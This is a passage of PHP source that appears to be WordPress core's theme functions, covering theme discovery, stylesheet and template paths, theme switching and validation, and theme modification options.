	foreach ( $theme_directories as $theme => $theme_root ) {
		if ( isset( $_themes[ $theme_root['theme_root'] . '/' . $theme ] ) ) {
			$themes[ $theme ] = $_themes[ $theme_root['theme_root'] . '/' . $theme ];
		} else {
			$themes[ $theme ] = new WP_Theme( $theme, $theme_root['theme_root'] );

			$_themes[ $theme_root['theme_root'] . '/' . $theme ] = $themes[ $theme ];
		}
	}

	if ( null !== $args['errors'] ) {
		foreach ( $themes as $theme => $wp_theme ) {
			if ( (bool) $wp_theme->errors() !== $args['errors'] ) {
				unset( $themes[ $theme ] );
			}
		}
	}

	return $themes;
}

/**
 * Gets a WP_Theme object for a theme.
 *
 * @since 3.4.0
 *
 * @global array $wp_theme_directories
 *
 * @param string $stylesheet Optional. Directory name for the theme. Defaults to active theme.
 * @param string $theme_root Optional. Absolute path of the theme root to look in.
 *                           If not specified, get_raw_theme_root() is used to calculate
 *                           the theme root for the $stylesheet provided (or active theme).
 * @return WP_Theme Theme object. Be sure to check the object's exists() method
 *                  if you need to confirm the theme's existence.
 */
function wp_get_theme( $stylesheet = '', $theme_root = '' ) {
	global $wp_theme_directories;

	if ( empty( $stylesheet ) ) {
		$stylesheet = get_stylesheet();
	}

	if ( empty( $theme_root ) ) {
		$theme_root = get_raw_theme_root( $stylesheet );
		if ( false === $theme_root ) {
			$theme_root = WP_CONTENT_DIR . '/themes';
		} elseif ( ! in_array( $theme_root, (array) $wp_theme_directories, true ) ) {
			$theme_root = WP_CONTENT_DIR . $theme_root;
		}
	}

	return new WP_Theme( $stylesheet, $theme_root );
}

/**
 * Clears the cache held by get_theme_roots() and WP_Theme.
 *
 * @since 3.5.0
 * @param bool $clear_update_cache Whether to clear the theme updates cache.
 */
function wp_clean_themes_cache( $clear_update_cache = true ) {
	if ( $clear_update_cache ) {
		delete_site_transient( 'update_themes' );
	}
	search_theme_directories( true );
	foreach ( wp_get_themes( array( 'errors' => null ) ) as $theme ) {
		$theme->cache_delete();
	}
}

/**
 * Whether a child theme is in use.
 *
 * @since 3.0.0
 * @since 6.5.0 Makes use of global template variables.
 *
 * @global string $wp_stylesheet_path Path to current theme's stylesheet directory.
 * @global string $wp_template_path   Path to current theme's template directory.
 *
 * @return bool True if a child theme is in use, false otherwise.
 */
function is_child_theme() {
	global $wp_stylesheet_path, $wp_template_path;

	return $wp_stylesheet_path !== $wp_template_path;
}

/**
 * Retrieves name of the current stylesheet.
 *
 * The theme name that is currently set as the front end theme.
 *
 * For all intents and purposes, the template name and the stylesheet name
 * are going to be the same for most cases.
 *
 * @since 1.5.0
 *
 * @return string Stylesheet name.
 */
function get_stylesheet() {
	/**
	 * Filters the name of current stylesheet.
	 *
	 * @since 1.5.0
	 *
	 * @param string $stylesheet Name of the current stylesheet.
	 */
	return apply_filters( 'stylesheet', get_option( 'stylesheet' ) );
}

/**
 * Retrieves stylesheet directory path for the active theme.
 *
 * @since 1.5.0
 * @since 6.4.0 Memoizes filter execution so that it only runs once for the current theme.
 * @since 6.4.2 Memoization removed.
 *
 * @return string Path to active theme's stylesheet directory.
 */
function get_stylesheet_directory() {
	$stylesheet     = get_stylesheet();
	$theme_root     = get_theme_root( $stylesheet );
	$stylesheet_dir = "$theme_root/$stylesheet";

	/**
	 * Filters the stylesheet directory path for the active theme.
	 *
	 * @since 1.5.0
	 *
	 * @param string $stylesheet_dir Absolute path to the active theme.
	 * @param string $stylesheet     Directory name of the active theme.
	 * @param string $theme_root     Absolute path to themes directory.
	 */
	return apply_filters( 'stylesheet_directory', $stylesheet_dir, $stylesheet, $theme_root );
}

/**
 * Retrieves stylesheet directory URI for the active theme.
 *
 * @since 1.5.0
 *
 * @return string URI to active theme's stylesheet directory.
 */
function get_stylesheet_directory_uri() {
	$stylesheet         = str_replace( '%2F', '/', rawurlencode( get_stylesheet() ) );
	$theme_root_uri     = get_theme_root_uri( $stylesheet );
	$stylesheet_dir_uri = "$theme_root_uri/$stylesheet";

	/**
	 * Filters the stylesheet directory URI.
	 *
	 * @since 1.5.0
	 *
	 * @param string $stylesheet_dir_uri Stylesheet directory URI.
	 * @param string $stylesheet         Name of the activated theme's directory.
	 * @param string $theme_root_uri     Themes root URI.
	 */
	return apply_filters( 'stylesheet_directory_uri', $stylesheet_dir_uri, $stylesheet, $theme_root_uri );
}

/**
 * Retrieves stylesheet URI for the active theme.
 *
 * The stylesheet file name is 'style.css' which is appended to the stylesheet directory URI path.
 * See get_stylesheet_directory_uri().
 *
 * @since 1.5.0
 *
 * @return string URI to active theme's stylesheet.
 */
function get_stylesheet_uri() {
	$stylesheet_dir_uri = get_stylesheet_directory_uri();
	$stylesheet_uri     = $stylesheet_dir_uri . '/style.css';
	/**
	 * Filters the URI of the active theme stylesheet.
	 *
	 * @since 1.5.0
	 *
	 * @param string $stylesheet_uri     Stylesheet URI for the active theme/child theme.
	 * @param string $stylesheet_dir_uri Stylesheet directory URI for the active theme/child theme.
	 */
	return apply_filters( 'stylesheet_uri', $stylesheet_uri, $stylesheet_dir_uri );
}

/**
 * Retrieves the localized stylesheet URI.
 *
 * The stylesheet directory for the localized stylesheet files are located, by
 * default, in the base theme directory. The name of the locale file will be the
 * locale followed by '.css'. If that does not exist, then the text direction
 * stylesheet will be checked for existence, for example 'ltr.css'.
 *
 * The theme may change the location of the stylesheet directory by either using
 * the {@see 'stylesheet_directory_uri'} or {@see 'locale_stylesheet_uri'} filters.
 *
 * If you want to change the location of the stylesheet files for the entire
 * WordPress workflow, then change the former. If you just have the locale in a
 * separate folder, then change the latter.
 *
 * @since 2.1.0
 *
 * @global WP_Locale $wp_locale WordPress date and time locale object.
 *
 * @return string URI to active theme's localized stylesheet.
 */
function get_locale_stylesheet_uri() {
	global $wp_locale;
	$stylesheet_dir_uri = get_stylesheet_directory_uri();
	$dir                = get_stylesheet_directory();
	$locale             = get_locale();
	if ( file_exists( "$dir/$locale.css" ) ) {
		$stylesheet_uri = "$stylesheet_dir_uri/$locale.css";
	} elseif ( ! empty( $wp_locale->text_direction ) && file_exists( "$dir/{$wp_locale->text_direction}.css" ) ) {
		$stylesheet_uri = "$stylesheet_dir_uri/{$wp_locale->text_direction}.css";
	} else {
		$stylesheet_uri = '';
	}
	/**
	 * Filters the localized stylesheet URI.
	 *
	 * @since 2.1.0
	 *
	 * @param string $stylesheet_uri     Localized stylesheet URI.
	 * @param string $stylesheet_dir_uri Stylesheet directory URI.
	 */
	return apply_filters( 'locale_stylesheet_uri', $stylesheet_uri, $stylesheet_dir_uri );
}

/**
 * Retrieves name of the active theme.
 *
 * @since 1.5.0
 *
 * @return string Template name.
 */
function get_template() {
	/**
	 * Filters the name of the active theme.
	 *
	 * @since 1.5.0
	 *
	 * @param string $template active theme's directory name.
	 */
	return apply_filters( 'template', get_option( 'template' ) );
}

/**
 * Retrieves template directory path for the active theme.
 *
 * @since 1.5.0
 * @since 6.4.0 Memoizes filter execution so that it only runs once for the current theme.
 * @since 6.4.1 Memoization removed.
 *
 * @return string Path to active theme's template directory.
 */
function get_template_directory() {
	$template     = get_template();
	$theme_root   = get_theme_root( $template );
	$template_dir = "$theme_root/$template";

	/**
	 * Filters the active theme directory path.
	 *
	 * @since 1.5.0
	 *
	 * @param string $template_dir The path of the active theme directory.
	 * @param string $template     Directory name of the active theme.
	 * @param string $theme_root   Absolute path to the themes directory.
	 */
	return apply_filters( 'template_directory', $template_dir, $template, $theme_root );
}

/**
 * Retrieves template directory URI for the active theme.
 *
 * @since 1.5.0
 *
 * @return string URI to active theme's template directory.
 */
function get_template_directory_uri() {
	$template         = str_replace( '%2F', '/', rawurlencode( get_template() ) );
	$theme_root_uri   = get_theme_root_uri( $template );
	$template_dir_uri = "$theme_root_uri/$template";

	/**
	 * Filters the active theme directory URI.
	 *
	 * @since 1.5.0
	 *
	 * @param string $template_dir_uri The URI of the active theme directory.
	 * @param string $template         Directory name of the active theme.
	 * @param string $theme_root_uri   The themes root URI.
	 */
	return apply_filters( 'template_directory_uri', $template_dir_uri, $template, $theme_root_uri );
}

/**
 * Retrieves theme roots.
 *
 * @since 2.9.0
 *
 * @global array $wp_theme_directories
 *
 * @return array|string An array of theme roots keyed by template/stylesheet
 *                      or a single theme root if all themes have the same root.
 */
function get_theme_roots() {
	global $wp_theme_directories;

	if ( ! is_array( $wp_theme_directories ) || count( $wp_theme_directories ) <= 1 ) {
		return '/themes';
	}

	$theme_roots = get_site_transient( 'theme_roots' );
	if ( false === $theme_roots ) {
		search_theme_directories( true ); // Regenerate the transient.
		$theme_roots = get_site_transient( 'theme_roots' );
	}
	return $theme_roots;
}

/**
 * Registers a directory that contains themes.
 *
 * @since 2.9.0
 *
 * @global array $wp_theme_directories
 *
 * @param string $directory Either the full filesystem path to a theme folder
 *                          or a folder within WP_CONTENT_DIR.
 * @return bool True if successfully registered a directory that contains themes,
 *              false if the directory does not exist.
 */
function register_theme_directory( $directory ) {
	global $wp_theme_directories;

	if ( ! file_exists( $directory ) ) {
		// Try prepending as the theme directory could be relative to the content directory.
		$directory = WP_CONTENT_DIR . '/' . $directory;
		// If this directory does not exist, return and do not register.
		if ( ! file_exists( $directory ) ) {
			return false;
		}
	}

	if ( ! is_array( $wp_theme_directories ) ) {
		$wp_theme_directories = array();
	}

	$untrailed = untrailingslashit( $directory );
	if ( ! empty( $untrailed ) && ! in_array( $untrailed, $wp_theme_directories, true ) ) {
		$wp_theme_directories[] = $untrailed;
	}

	return true;
}

/**
 * Searches all registered theme directories for complete and valid themes.
 *
 * @since 2.9.0
 *
 * @global array $wp_theme_directories
 *
 * @param bool $force Optional. Whether to force a new directory scan. Default false.
 * @return array|false Valid themes found on success, false on failure.
 */
function search_theme_directories( $force = false ) {
	global $wp_theme_directories;
	static $found_themes = null;

	if ( empty( $wp_theme_directories ) ) {
		return false;
	}

	if ( ! $force && isset( $found_themes ) ) {
		return $found_themes;
	}

	$found_themes = array();

	$wp_theme_directories = (array) $wp_theme_directories;
	$relative_theme_roots = array();

	/*
	 * Set up maybe-relative, maybe-absolute array of theme directories.
	 * We always want to return absolute, but we need to cache relative
	 * to use in get_theme_root().
	 */
	foreach ( $wp_theme_directories as $theme_root ) {
		if ( str_starts_with( $theme_root, WP_CONTENT_DIR ) ) {
			$relative_theme_roots[ str_replace( WP_CONTENT_DIR, '', $theme_root ) ] = $theme_root;
		} else {
			$relative_theme_roots[ $theme_root ] = $theme_root;
		}
	}

	/**
	 * Filters whether to get the cache of the registered theme directories.
	 *
	 * @since 3.4.0
	 *
	 * @param bool   $cache_expiration Whether to get the cache of the theme directories. Default false.
	 * @param string $context          The class or function name calling the filter.
	 */
	$cache_expiration = apply_filters( 'wp_cache_themes_persistently', false, 'search_theme_directories' );

	if ( $cache_expiration ) {
		$cached_roots = get_site_transient( 'theme_roots' );
		if ( is_array( $cached_roots ) ) {
			foreach ( $cached_roots as $theme_dir => $theme_root ) {
				// A cached theme root is no longer around, so skip it.
				if ( ! isset( $relative_theme_roots[ $theme_root ] ) ) {
					continue;
				}
				$found_themes[ $theme_dir ] = array(
					'theme_file' => $theme_dir . '/style.css',
					'theme_root' => $relative_theme_roots[ $theme_root ], // Convert relative to absolute.
				);
			}
			return $found_themes;
		}
		if ( ! is_int( $cache_expiration ) ) {
			$cache_expiration = 30 * MINUTE_IN_SECONDS;
		}
	} else {
		$cache_expiration = 30 * MINUTE_IN_SECONDS;
	}

	/* Loop the registered theme directories and extract all themes */
	foreach ( $wp_theme_directories as $theme_root ) {

		// Start with directories in the root of the active theme directory.
		$dirs = @ scandir( $theme_root );
		if ( ! $dirs ) {
			wp_trigger_error( __FUNCTION__,"$theme_root is not readable" );
			continue;
		}
		foreach ( $dirs as $dir ) {
			if ( ! is_dir( $theme_root . '/' . $dir ) || '.' === $dir[0] || 'CVS' === $dir ) {
				continue;
			}
			if ( file_exists( $theme_root . '/' . $dir . '/style.css' ) ) {
				/*
				 * wp-content/themes/a-single-theme
				 * wp-content/themes is $theme_root, a-single-theme is $dir.
				 */
				$found_themes[ $dir ] = array(
					'theme_file' => $dir . '/style.css',
					'theme_root' => $theme_root,
				);
			} else {
				$found_theme = false;
				/*
				 * wp-content/themes/a-folder-of-themes/*
				 * wp-content/themes is $theme_root, a-folder-of-themes is $dir, then themes are $sub_dirs.
				 */
				$sub_dirs = @ scandir( $theme_root . '/' . $dir );
				if ( ! $sub_dirs ) {
					wp_trigger_error( __FUNCTION__, "$theme_root/$dir is not readable" );
					continue;
				}
				foreach ( $sub_dirs as $sub_dir ) {
					if ( ! is_dir( $theme_root . '/' . $dir . '/' . $sub_dir ) || '.' === $dir[0] || 'CVS' === $dir ) {
						continue;
					}
					if ( ! file_exists( $theme_root . '/' . $dir . '/' . $sub_dir . '/style.css' ) ) {
						continue;
					}
					$found_themes[ $dir . '/' . $sub_dir ] = array(
						'theme_file' => $dir . '/' . $sub_dir . '/style.css',
						'theme_root' => $theme_root,
					);
					$found_theme                           = true;
				}
				/*
				 * Never mind the above, it's just a theme missing a style.css.
				 * Return it; WP_Theme will catch the error.
				 */
				if ( ! $found_theme ) {
					$found_themes[ $dir ] = array(
						'theme_file' => $dir . '/style.css',
						'theme_root' => $theme_root,
					);
				}
			}
		}
	}

	asort( $found_themes );

	$theme_roots          = array();
	$relative_theme_roots = array_flip( $relative_theme_roots );

	foreach ( $found_themes as $theme_dir => $theme_data ) {
		$theme_roots[ $theme_dir ] = $relative_theme_roots[ $theme_data['theme_root'] ]; // Convert absolute to relative.
	}

	if ( get_site_transient( 'theme_roots' ) !== $theme_roots ) {
		set_site_transient( 'theme_roots', $theme_roots, $cache_expiration );
	}

	return $found_themes;
}

/**
 * Retrieves path to themes directory.
 *
 * Does not have trailing slash.
 *
 * @since 1.5.0
 *
 * @global array $wp_theme_directories
 *
 * @param string $stylesheet_or_template Optional. The stylesheet or template name of the theme.
 *                                       Default is to leverage the main theme root.
 * @return string Themes directory path.
 */
function get_theme_root( $stylesheet_or_template = '' ) {
	global $wp_theme_directories;

	$theme_root = '';

	if ( $stylesheet_or_template ) {
		$theme_root = get_raw_theme_root( $stylesheet_or_template );
		if ( $theme_root ) {
			/*
			 * Always prepend WP_CONTENT_DIR unless the root currently registered as a theme directory.
			 * This gives relative theme roots the benefit of the doubt when things go haywire.
			 */
			if ( ! in_array( $theme_root, (array) $wp_theme_directories, true ) ) {
				$theme_root = WP_CONTENT_DIR . $theme_root;
			}
		}
	}

	if ( ! $theme_root ) {
		$theme_root = WP_CONTENT_DIR . '/themes';
	}

	/**
	 * Filters the absolute path to the themes directory.
	 *
	 * @since 1.5.0
	 *
	 * @param string $theme_root Absolute path to themes directory.
	 */
	return apply_filters( 'theme_root', $theme_root );
}

/**
 * Retrieves URI for themes directory.
 *
 * Does not have trailing slash.
 *
 * @since 1.5.0
 *
 * @global array $wp_theme_directories
 *
 * @param string $stylesheet_or_template Optional. The stylesheet or template name of the theme.
 *                                       Default is to leverage the main theme root.
 * @param string $theme_root             Optional. The theme root for which calculations will be based,
 *                                       preventing the need for a get_raw_theme_root() call. Default empty.
 * @return string Themes directory URI.
 */
function get_theme_root_uri( $stylesheet_or_template = '', $theme_root = '' ) {
	global $wp_theme_directories;

	if ( $stylesheet_or_template && ! $theme_root ) {
		$theme_root = get_raw_theme_root( $stylesheet_or_template );
	}

	if ( $stylesheet_or_template && $theme_root ) {
		if ( in_array( $theme_root, (array) $wp_theme_directories, true ) ) {
			// Absolute path. Make an educated guess. YMMV -- but note the filter below.
			if ( str_starts_with( $theme_root, WP_CONTENT_DIR ) ) {
				$theme_root_uri = content_url( str_replace( WP_CONTENT_DIR, '', $theme_root ) );
			} elseif ( str_starts_with( $theme_root, ABSPATH ) ) {
				$theme_root_uri = site_url( str_replace( ABSPATH, '', $theme_root ) );
			} elseif ( str_starts_with( $theme_root, WP_PLUGIN_DIR ) || str_starts_with( $theme_root, WPMU_PLUGIN_DIR ) ) {
				$theme_root_uri = plugins_url( basename( $theme_root ), $theme_root );
			} else {
				$theme_root_uri = $theme_root;
			}
		} else {
			$theme_root_uri = content_url( $theme_root );
		}
	} else {
		$theme_root_uri = content_url( 'themes' );
	}

	/**
	 * Filters the URI for themes directory.
	 *
	 * @since 1.5.0
	 *
	 * @param string $theme_root_uri         The URI for themes directory.
	 * @param string $siteurl                WordPress web address which is set in General Options.
	 * @param string $stylesheet_or_template The stylesheet or template name of the theme.
	 */
	return apply_filters( 'theme_root_uri', $theme_root_uri, get_option( 'siteurl' ), $stylesheet_or_template );
}

/**
 * Gets the raw theme root relative to the content directory with no filters applied.
 *
 * @since 3.1.0
 *
 * @global array $wp_theme_directories
 *
 * @param string $stylesheet_or_template The stylesheet or template name of the theme.
 * @param bool   $skip_cache             Optional. Whether to skip the cache.
 *                                       Defaults to false, meaning the cache is used.
 * @return string Theme root.
 */
function get_raw_theme_root( $stylesheet_or_template, $skip_cache = false ) {
	global $wp_theme_directories;

	if ( ! is_array( $wp_theme_directories ) || count( $wp_theme_directories ) <= 1 ) {
		return '/themes';
	}

	$theme_root = false;

	// If requesting the root for the active theme, consult options to avoid calling get_theme_roots().
	if ( ! $skip_cache ) {
		if ( get_option( 'stylesheet' ) === $stylesheet_or_template ) {
			$theme_root = get_option( 'stylesheet_root' );
		} elseif ( get_option( 'template' ) === $stylesheet_or_template ) {
			$theme_root = get_option( 'template_root' );
		}
	}

	if ( empty( $theme_root ) ) {
		$theme_roots = get_theme_roots();
		if ( ! empty( $theme_roots[ $stylesheet_or_template ] ) ) {
			$theme_root = $theme_roots[ $stylesheet_or_template ];
		}
	}

	return $theme_root;
}

/**
 * Displays localized stylesheet link element.
 *
 * @since 2.1.0
 */
function locale_stylesheet() {
	$stylesheet = get_locale_stylesheet_uri();
	if ( empty( $stylesheet ) ) {
		return;
	}

	$type_attr = current_theme_supports( 'html5', 'style' ) ? '' : ' type="text/css"';

	printf(
		'<link rel="stylesheet" href="%s"%s media="screen" />',
		$stylesheet,
		$type_attr
	);
}

/**
 * Switches the theme.
 *
 * Accepts one argument: $stylesheet of the theme. It also accepts an additional function signature
 * of two arguments: $template then $stylesheet. This is for backward compatibility.
 *
 * @since 2.5.0
 *
 * @global array                $wp_theme_directories
 * @global WP_Customize_Manager $wp_customize
 * @global array                $sidebars_widgets
 * @global array                $wp_registered_sidebars
 *
 * @param string $stylesheet Stylesheet name.
 */
function switch_theme( $stylesheet ) {
	global $wp_theme_directories, $wp_customize, $sidebars_widgets, $wp_registered_sidebars;

	$requirements = validate_theme_requirements( $stylesheet );
	if ( is_wp_error( $requirements ) ) {
		wp_die( $requirements );
	}

	$_sidebars_widgets = null;
	if ( 'wp_ajax_customize_save' === current_action() ) {
		$old_sidebars_widgets_data_setting = $wp_customize->get_setting( 'old_sidebars_widgets_data' );
		if ( $old_sidebars_widgets_data_setting ) {
			$_sidebars_widgets = $wp_customize->post_value( $old_sidebars_widgets_data_setting );
		}
	} elseif ( is_array( $sidebars_widgets ) ) {
		$_sidebars_widgets = $sidebars_widgets;
	}

	if ( is_array( $_sidebars_widgets ) ) {
		set_theme_mod(
			'sidebars_widgets',
			array(
				'time' => time(),
				'data' => $_sidebars_widgets,
			)
		);
	}

	$nav_menu_locations = get_theme_mod( 'nav_menu_locations' );
	update_option( 'theme_switch_menu_locations', $nav_menu_locations, true );

	if ( func_num_args() > 1 ) {
		$stylesheet = func_get_arg( 1 );
	}

	$old_theme = wp_get_theme();
	$new_theme = wp_get_theme( $stylesheet );
	$template  = $new_theme->get_template();

	if ( wp_is_recovery_mode() ) {
		$paused_themes = wp_paused_themes();
		$paused_themes->delete( $old_theme->get_stylesheet() );
		$paused_themes->delete( $old_theme->get_template() );
	}

	update_option( 'template', $template );
	update_option( 'stylesheet', $stylesheet );

	if ( count( $wp_theme_directories ) > 1 ) {
		update_option( 'template_root', get_raw_theme_root( $template, true ) );
		update_option( 'stylesheet_root', get_raw_theme_root( $stylesheet, true ) );
	} else {
		delete_option( 'template_root' );
		delete_option( 'stylesheet_root' );
	}

	$new_name = $new_theme->get( 'Name' );

	update_option( 'current_theme', $new_name );

	// Migrate from the old mods_{name} option to theme_mods_{slug}.
	if ( is_admin() && false === get_option( 'theme_mods_' . $stylesheet ) ) {
		$default_theme_mods = (array) get_option( 'mods_' . $new_name );
		if ( ! empty( $nav_menu_locations ) && empty( $default_theme_mods['nav_menu_locations'] ) ) {
			$default_theme_mods['nav_menu_locations'] = $nav_menu_locations;
		}
		add_option( "theme_mods_$stylesheet", $default_theme_mods );
	} else {
		/*
		 * Since retrieve_widgets() is called when initializing a theme in the Customizer,
		 * we need to remove the theme mods to avoid overwriting changes made via
		 * the Customizer when accessing wp-admin/widgets.php.
		 */
		if ( 'wp_ajax_customize_save' === current_action() ) {
			remove_theme_mod( 'sidebars_widgets' );
		}
	}

	// Stores classic sidebars for later use by block themes.
	if ( $new_theme->is_block_theme() ) {
		set_theme_mod( 'wp_classic_sidebars', $wp_registered_sidebars );
	}

	update_option( 'theme_switched', $old_theme->get_stylesheet() );

	/*
	 * Reset template globals when switching themes outside of a switched blog
	 * context to ensure templates will be loaded from the new theme.
	 */
	if ( ! is_multisite() || ! ms_is_switched() ) {
		wp_set_template_globals();
	}

	// Clear pattern caches.
	if ( ! is_multisite() ) {
		$new_theme->delete_pattern_cache();
		$old_theme->delete_pattern_cache();
	}

	// Set autoload=no for the old theme, autoload=yes for the switched theme.
	$theme_mods_options = array(
		'theme_mods_' . $stylesheet                  => 'yes',
		'theme_mods_' . $old_theme->get_stylesheet() => 'no',
	);
	wp_set_option_autoload_values( $theme_mods_options );

	/**
	 * Fires after the theme is switched.
	 *
	 * See {@see 'after_switch_theme'}.
	 *
	 * @since 1.5.0
	 * @since 4.5.0 Introduced the `$old_theme` parameter.
	 *
	 * @param string   $new_name  Name of the new theme.
	 * @param WP_Theme $new_theme WP_Theme instance of the new theme.
	 * @param WP_Theme $old_theme WP_Theme instance of the old theme.
	 */
	do_action( 'switch_theme', $new_name, $new_theme, $old_theme );
}

/**
 * Checks that the active theme has the required files.
 *
 * Standalone themes need to have a `templates/index.html` or `index.php` template file.
 * Child themes need to have a `Template` header in the `style.css` stylesheet.
 *
 * Does not initially check the default theme, which is the fallback and should always exist.
 * But if it doesn't exist, it'll fall back to the latest core default theme that does exist.
 * Will switch theme to the fallback theme if active theme does not validate.
 *
 * You can use the {@see 'validate_current_theme'} filter to return false to disable
 * this functionality.
 *
 * @since 1.5.0
 * @since 6.0.0 Removed the requirement for block themes to have an `index.php` template.
 *
 * @see WP_DEFAULT_THEME
 *
 * @return bool
 */
function validate_current_theme() {
	/**
	 * Filters whether to validate the active theme.
	 *
	 * @since 2.7.0
	 *
	 * @param bool $validate Whether to validate the active theme. Default true.
	 */
	if ( wp_installing() || ! apply_filters( 'validate_current_theme', true ) ) {
		return true;
	}

	if (
		! file_exists( get_template_directory() . '/templates/index.html' )
		&& ! file_exists( get_template_directory() . '/block-templates/index.html' ) // Deprecated path support since 5.9.0.
		&& ! file_exists( get_template_directory() . '/index.php' )
	) {
		// Invalid.
	} elseif ( ! file_exists( get_template_directory() . '/style.css' ) ) {
		// Invalid.
	} elseif ( is_child_theme() && ! file_exists( get_stylesheet_directory() . '/style.css' ) ) {
		// Invalid.
	} else {
		// Valid.
		return true;
	}

	$default = wp_get_theme( WP_DEFAULT_THEME );
	if ( $default->exists() ) {
		switch_theme( WP_DEFAULT_THEME );
		return false;
	}

	/**
	 * If we're in an invalid state but WP_DEFAULT_THEME doesn't exist,
	 * switch to the latest core default theme that's installed.
	 *
	 * If it turns out that this latest core default theme is our current
	 * theme, then there's nothing we can do about that, so we have to bail,
	 * rather than going into an infinite loop. (This is why there are
	 * checks against WP_DEFAULT_THEME above, also.) We also can't do anything
	 * if it turns out there is no default theme installed. (That's `false`.)
	 */
	$default = WP_Theme::get_core_default_theme();
	if ( false === $default || get_stylesheet() === $default->get_stylesheet() ) {
		return true;
	}

	switch_theme( $default->get_stylesheet() );
	return false;
}

/**
 * Validates the theme requirements for WordPress version and PHP version.
 *
 * Uses the information from `Requires at least` and `Requires PHP` headers
 * defined in the theme's `style.css` file.
 *
 * @since 5.5.0
 * @since 5.8.0 Removed support for using `readme.txt` as a fallback.
 *
 * @param string $stylesheet Directory name for the theme.
 * @return true|WP_Error True if requirements are met, WP_Error on failure.
 */
function validate_theme_requirements( $stylesheet ) {
	$theme = wp_get_theme( $stylesheet );

	$requirements = array(
		'requires'     => ! empty( $theme->get( 'RequiresWP' ) ) ? $theme->get( 'RequiresWP' ) : '',
		'requires_php' => ! empty( $theme->get( 'RequiresPHP' ) ) ? $theme->get( 'RequiresPHP' ) : '',
	);

	$compatible_wp  = is_wp_version_compatible( $requirements['requires'] );
	$compatible_php = is_php_version_compatible( $requirements['requires_php'] );

	if ( ! $compatible_wp && ! $compatible_php ) {
		return new WP_Error(
			'theme_wp_php_incompatible',
			sprintf(
				/* translators: %s: Theme name. */
				_x( '<strong>Error:</strong> Current WordPress and PHP versions do not meet minimum requirements for %s.', 'theme' ),
				$theme->display( 'Name' )
			)
		);
	} elseif ( ! $compatible_php ) {
		return new WP_Error(
			'theme_php_incompatible',
			sprintf(
				/* translators: %s: Theme name. */
				_x( '<strong>Error:</strong> Current PHP version does not meet minimum requirements for %s.', 'theme' ),
				$theme->display( 'Name' )
			)
		);
	} elseif ( ! $compatible_wp ) {
		return new WP_Error(
			'theme_wp_incompatible',
			sprintf(
				/* translators: %s: Theme name. */
				_x( '<strong>Error:</strong> Current WordPress version does not meet minimum requirements for %s.', 'theme' ),
				$theme->display( 'Name' )
			)
		);
	}

	return true;
}

/**
 * Retrieves all theme modifications.
 *
 * @since 3.1.0
 * @since 5.9.0 The return value is always an array.
 *
 * @return array Theme modifications.
 */
function get_theme_mods() {
	$theme_slug = get_option( 'stylesheet' );
	$mods       = get_option( "theme_mods_$theme_slug" );

	if ( false === $mods ) {
		$theme_name = get_option( 'current_theme' );
		if ( false === $theme_name ) {
			$theme_name = wp_get_theme()->get( 'Name' );
		}

		$mods = get_option( "mods_$theme_name" ); // Deprecated location.
		if ( is_admin() && false !== $mods ) {
			update_option( "theme_mods_$theme_slug", $mods );
			delete_option( "mods_$theme_name" );
		}}

	if ( ! is_array( $mods ) ) {
		$mods = array();
	}

	return $mods;
}

/**
 * Retrieves theme modification value for the active theme.
 *
 * If the modification name does not exist and `$default_value` is a string, then the
 * default will be passed through the {@link https://www.php.net/sprintf sprintf()}
 * PHP function with the template directory URI as the first value and the
 * stylesheet directory URI as the second value.
 *
 * @since 2.1.0
 *
 * @param string $name          Theme modification name.
 * @param mixed  $default_value Optional. Theme modification default value. Default false.
 * @return mixed Theme modification value.
 */
function get_theme_mod( $name, $default_value = false ) {
	$mods = get_theme_mods();

	if ( isset( $mods[ $name ] ) ) {
		/**
		 * Filters the theme modification, or 'theme_mod', value.
		 *
		 * The dynamic portion of the hook name, `$name`, refers to the key name
		 * of the modification array. For example, 'header_textcolor', 'header_image',
		 * and so on depending on the theme options.
		 *
		 * @since 2.2.0
		 *
		 * @param mixed $current_mod The value of the active theme modification.
		 */
		return apply_filters( "theme_mod_{$name}", $mods[ $name ] );
	}

	if ( is_string( $default_value ) ) {
		// Only run the replacement if an sprintf() string format pattern was found.
		if ( preg_match( '#(?<!%)%(?:\d+\$?)?s#', $default_value ) ) {
			// Remove a single trailing percent sign.
			$default_value = preg_replace( '#(?<!%)%$#', '', $default_value );
			$default_value = sprintf( $default_value, get_template_directory_uri(), get_stylesheet_directory_uri() );
		}
	}

	/** This filter is documented in wp-includes/theme.php */
	return apply_filters( "theme_mod_{$name}", $default_value );
}

/**
 * Updates theme modification value for the active theme.
 *
 * @since 2.1.0
 * @since 5.6.0 A return value was added.
 *
 * @param string $name  Theme modification name.
 * @param mixed  $value Theme modification value.
 * @return bool True if the value was updated, false otherwise.
 */
function set_theme_mod( $name, $value ) {
	$mods      = get_theme_mods();
	$old_value = isset( $mods[ $name ] ) ? $mods[ $name ] : false;

	/**
	 * Filters the theme modification, or 'theme_mod', value on save.
	 *
	 * The dynamic portion of the hook name, `$name`, refers to the key name
	 * of the modification array. For example, 'header_textcolor', 'header_image',
	 * and so on depending on the theme options.
	 *
	 * @since 3.9.0
	 *
	 * @param mixed $value     The new value of the theme modification.
	 * @param mixed $old_value The current value of the theme modification.
	 */
	$mods[ $name ] = apply_filters( "pre_set_theme_mod_{$name}", $value, $old_value );

	$theme = get_option( 'stylesheet' );

	return update_option( "theme_mods_$theme", $mods );
}

/**
 * Removes theme modification name from active theme list.
 *
 * If removing the name also removes all elements, then the entire option
 * will be removed.
 *
 * @since 2.1.0
 *
 * @param string $name Theme modification name.
 */
function remove_theme_mod( $name ) {
	$mods = get_theme_mods();

	if ( ! isset( $mods[ $name ] ) ) {
		return;
	}

	unset( $mods[ $name ] );

	if ( empty( $mods ) ) {
		remove_theme_mods();
		return;
	}

	$theme = get_option( 'stylesheet' );

	update_option( "theme_mods_$theme", $mods );
}

/**
 * Removes theme modifications option for the active theme.
 *
 * @since 2.1.0
 */
function remove_theme_mods() {
	delete_option( 'theme_mods_' . get_option( 'stylesheet' ) );

	// Old style.
	$theme_name = get_option( 'current_theme' );
	if ( false === $theme_name ) {
		$theme_name = wp_get_theme()->get( 'Name' );
	}

	delete_option( 'mods_' . $theme_name );
}

/**
 * Retrieves the custom header text color in 3- or 6-digit hexadecimal form.
 *
 * @since 2.1.0
 *
 * @return string Header text color in 3- or 6-digit hexadecimal form (minus the hash symbol).
 */
function get_header_textcolor() {
	return get_theme_mod( 'header_textcolor', get_theme_support( 'custom-header', 'default-text-color' ) );
}

/**
 * Displays the custom header text color in 3- or 6-digit hexadecimal form (minus the hash symbol).
 *
 * @since 2.1.0
 */
function header_textcolor() {
	echo get_header_textcolor();
}

/**
 * Whether to display the header text.
 *
